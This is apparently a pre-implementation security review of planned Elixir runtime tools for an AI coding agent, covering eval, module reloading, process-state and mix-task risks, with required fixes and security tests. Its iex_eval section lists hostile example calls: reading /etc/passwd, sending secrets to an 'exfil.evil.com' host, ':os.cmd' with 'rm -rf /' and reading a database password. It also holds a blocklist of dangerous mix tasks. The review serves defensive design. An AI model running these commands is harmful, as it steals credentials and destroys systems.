# Phase 5 Planning Review: Elixir-Specific Tools

**Review Date:** 2026-01-01
**Status:** Pre-Implementation Review
**Document Reviewed:** `/notes/planning/tooling/phase-05-tools.md`

## Executive Summary

Phase 5 introduces 8 Elixir-specific tools for BEAM runtime introspection. This is a **high-risk phase** due to tools like `iex_eval` (arbitrary code execution) and `reload_module` (hot code loading). The review identified **critical architectural and security issues** that must be resolved before implementation.

**Key Finding:** The Lua sandbox provides FALSE security guarantees for Phase 5 tools. The dangerous operations (Code.eval_string, :sys.get_state, etc.) execute in Elixir, not Lua. The sandbox only restricts Lua's `os.execute` - it provides zero protection against malicious Elixir code.

---

## Blockers (Must Fix Before Implementation)

### 1. 🚨 iex_eval: Unrestricted Code Execution

**Location:** Section 5.1

**Issue:** `Code.eval_string` with user-provided code enables complete system compromise:
- File system access: `File.read!("/etc/passwd")`
- Network operations: `HTTPoison.get("https://exfil.evil.com?data=#{secrets}")`
- System commands: `:os.cmd('rm -rf /')`
- Secret access: `System.get_env("DATABASE_PASSWORD")`

The Lua sandbox provides no protection because the Elixir code executes outside Lua.

**Required Actions:**
- Define explicit security model (sandboxed BEAM node, module allowlist, or accept as unsafe)
- Add AST analysis to block dangerous module calls
- Document that this is a high-risk tool requiring explicit opt-in

### 2. 🚨 reload_module: Code Injection Vector

**Location:** Section 5.5

**Issue:** The planned implementation is technically incorrect:
- `Code.purge/1` + `Code.load_file/1` doesn't work for compiled modules
- Combined with file write capabilities, allows permanent backdoor installation
- No validation that module is within project boundary

**Required Actions:**
- Use `IEx.Helpers.r/1` or `:code.purge` + `:code.load_file` (Erlang)
- Add module allowlist (block reloading :kernel, :stdlib, security modules)
- Validate module source file is within project

### 3. 🚨 get_process_state: Sensitive Data Exposure

**Location:** Section 5.3

**Issue:** `:sys.get_state/2` can inspect ANY process, exposing:
- API keys and secrets in process state
- Database credentials
- Session tokens
- The security modules themselves

Also, `:sys.get_state/2` fails on non-OTP processes (raw spawned processes).

**Required Actions:**
- Add process allowlist/blocklist
- Implement fallback for non-OTP processes
- Consider restricting to user-created processes only

### 4. 🚨 mix_task: Incomplete Blocklist

**Location:** Section 5.2

**Issue:** The blocklist only covers 3 tasks. Missing dangerous tasks:
- `mix archive.install` - Can install malicious archives
- `mix escript.build` - Creates executables
- `mix local.hex` / `mix local.rebar` - Modifies toolchain
- `mix hex.publish` - Publishes packages
- `mix do` - Chains multiple commands

**Required Actions:**
- Expand blocklist comprehensively
- Consider using blocklist approach (block known dangerous) vs allowlist (allow known safe)
- Document that even allowed tasks execute arbitrary code (mix.exs, macros)

### 5. 🚨 Architectural Pattern Inconsistency

**Location:** All Phase 5 sections

**Issue:** Phase 3/4 established that many tools use the Handler pattern (direct Elixir), not Lua sandbox. Phase 5 routes everything through Lua despite:
- Pure introspection tools (fetch_elixir_docs, inspect_supervisor) don't benefit from Lua
- The Lua layer adds complexity without security benefit for these tools

**Required Actions:**
- Classify tools by risk level and choose appropriate pattern:
  | Tool | Risk | Recommended Pattern |
  |------|------|---------------------|
  | fetch_elixir_docs | Low | Handler |
  | inspect_supervisor | Medium | Handler with scope restriction |
  | ets_inspect | Medium | Handler with table filtering |
  | get_process_state | High | Handler with explicit allowlist |
  | mix_task | Medium | Handler (via System.cmd) |
  | run_exunit | Medium | Handler (via System.cmd) |
  | reload_module | High | Handler with strict validation |
  | iex_eval | Critical | Dedicated security model required |

### 6. 🚨 Parameter Type `:any` Not Supported

**Location:** Section 5.6.1.2 (ets_inspect)

**Issue:** The `key` and `pattern` parameters use `:any` type, but the Tool module only supports: `:string`, `:integer`, `:number`, `:boolean`, `:array`, `:object`.

**Required Action:** Use `:string` with JSON encoding or `:object` type.

---

## Concerns (Should Address)

### 1. ⚠️ Session Binding Storage

**Location:** Section 5.1.2.7

**Issue:** Plan shows bindings persisting in Lua state, but Elixir bindings (keyword lists with PIDs, functions, structs) cannot serialize through Lua.

**Recommendation:** Store Elixir bindings in `Session.State` GenServer, not Lua state.

### 2. ⚠️ ETS Table Access Control

**Location:** Section 5.6

**Issue:** Protected/private tables will fail when accessed from a different process. System tables (`:code`, `:shell`) may expose sensitive data.

**Recommendation:** Add table allowlist, check access permissions before operations.

### 3. ⚠️ Atom Table Exhaustion

**Location:** Multiple sections (5.5.2.2, 5.7.2.2, 5.3.2.2)

**Issue:** Using `String.to_atom/1` on user input risks atom table exhaustion (DoS).

**Recommendation:** Use `String.to_existing_atom/1` with proper error handling.

### 4. ⚠️ mix_task/run_exunit Overlap with run_command

**Location:** Sections 5.2, 5.8

**Issue:** Existing `run_command` handler already supports `mix` commands. The new tools duplicate functionality.

**Recommendation:** Make `mix_task` and `run_exunit` thin wrappers that add specialized argument building and output parsing, sharing command execution logic.

### 5. ⚠️ Missing Telemetry

**Location:** All Phase 5 sections

**Issue:** Phase 3 established telemetry emission patterns, but Phase 5 doesn't mention telemetry.

**Recommendation:** Add telemetry requirements:
```elixir
[:jido_code, :elixir, :iex_eval]
[:jido_code, :elixir, :mix_task]
# etc.
```

### 6. ⚠️ Module Definition in iex_eval

**Location:** Section 5.1.4

**Issue:** Modules defined via `Code.eval_string` persist globally:
- No cleanup on session end
- Redefining causes warnings
- Could override security modules

**Recommendation:** Track defined modules for session cleanup, or block module definitions entirely.

### 7. ⚠️ Naming Convention Inconsistencies

**Location:** Throughout Phase 5

**Issue:** Manager functions don't match tool names:
| Tool Name | Planned Manager Function |
|-----------|-------------------------|
| get_process_state | process_state/2 |
| inspect_supervisor | supervisor_tree/2 |
| ets_inspect | ets/2 |
| fetch_elixir_docs | docs/2 |
| run_exunit | exunit/2 |

**Recommendation:** Align Manager function names with tool names for consistency.

---

## Missing Test Coverage

### Security Tests (Critical)

The following security tests are missing from the planning:

**iex_eval:**
- [ ] Test blocks `:os.cmd` execution
- [ ] Test blocks `System.cmd` execution
- [ ] Test blocks `File.rm_rf` outside project
- [ ] Test blocks `Node.connect` attempts
- [ ] Test handles infinite loop with timeout
- [ ] Test blocks module definition with malicious callbacks

**mix_task:**
- [ ] Test blocks task names not in allowlist
- [ ] Test sanitizes shell metacharacters in args
- [ ] Test blocks `mix do` command chaining

**get_process_state:**
- [ ] Test rejects malformed PID strings
- [ ] Test blocks inspection of system-critical processes
- [ ] Test rejects cross-node PIDs

**reload_module:**
- [ ] Test blocks reloading of :kernel, :stdlib modules
- [ ] Test blocks reloading of security-critical modules
- [ ] Test validates module exists in project codebase

**ets_inspect:**
- [ ] Test respects protected table access settings
- [ ] Test blocks access to system ETS tables

### Timeout Tests (Missing Across All Tools)

- [ ] get_process_state timeout test
- [ ] inspect_supervisor timeout test
- [ ] ets_inspect with large tables test
- [ ] mix_task timeout test
- [ ] run_exunit timeout test

---

## Suggestions (Improvements)

### 1. 💡 Process Isolation for High-Risk Tools

For `iex_eval` and `reload_module`, consider:
- Dedicated BEAM node with limited connectivity
- Port protocol for communication
- Container/Docker isolation

### 2. 💡 Shared Helper Modules

Extract common patterns:
```elixir
JidoCode.Tools.Helpers.ProcessLookup   # PID/name parsing
JidoCode.Tools.Helpers.ModuleParser    # Module name -> atom
JidoCode.Tools.Helpers.TimeoutExec     # Task with timeout
```

### 3. 💡 Mix Tasks via System.cmd

Execute mix tasks via `System.cmd("mix", [...])` rather than in-VM `Mix.Task.run/2` for process isolation.

### 4. 💡 Capability-Based Security for iex_eval

Define allowed modules (Enum, String, Map) and block dangerous ones (File, System, Port, :os).

### 5. 💡 Audit Logging

Add comprehensive logging for all Phase 5 operations with:
- User/session identification
- Full operation details
- Alerting on suspicious patterns

---

## Good Practices Noted

### ✅ Session-Scoped State Management
Correctly addresses session-scoped bindings for `iex_eval`.

### ✅ Timeout Handling
Plan includes timeout parameters for operations that could hang.

### ✅ Destructive Operation Guards for mix_task
Following the pattern from `git_command`, appropriately identifies blocked operations.

### ✅ Depth Limiting for Supervisor Inspection
Prevents runaway recursion with configurable depth limit.

### ✅ Limit Parameter for ETS Operations
Awareness of large table concerns with pagination support.

### ✅ Using Code.fetch_docs/1
Modern and correct approach for documentation retrieval.

### ✅ Reference to ADR
Maintains architectural documentation links.

---

## Summary

| Category | Count |
|----------|-------|
| Blockers | 6 |
| Concerns | 7 |
| Missing Tests | 15+ |
| Suggestions | 5 |
| Good Practices | 7 |

**Recommendation:** Phase 5 requires significant planning revisions before implementation. The fundamental issue is that the Lua sandbox provides no security for most Phase 5 tools. Consider:

1. Removing or heavily restricting `iex_eval` and `reload_module`
2. Using Handler pattern for safe introspection tools
3. Implementing proper BEAM-level sandboxing for code evaluation
4. Expanding security test coverage significantly

---

## Files Reviewed

- `/home/ducky/code/agentjido/jido_code_tooling/notes/planning/tooling/phase-05-tools.md`
- `/home/ducky/code/agentjido/jido_code_tooling/notes/planning/tooling/phase-03-tools.md`
- `/home/ducky/code/agentjido/jido_code_tooling/notes/planning/tooling/phase-04-tools.md`
- `/home/ducky/code/agentjido/jido_code_tooling/lib/jido_code/tools/bridge.ex`
- `/home/ducky/code/agentjido/jido_code_tooling/lib/jido_code/tools/manager.ex`
- `/home/ducky/code/agentjido/jido_code_tooling/lib/jido_code/tools/security.ex`
- `/home/ducky/code/agentjido/jido_code_tooling/lib/jido_code/tools/handlers/`
- `/home/ducky/code/agentjido/jido_code_tooling/test/jido_code/integration/tools_phase3_test.exs`
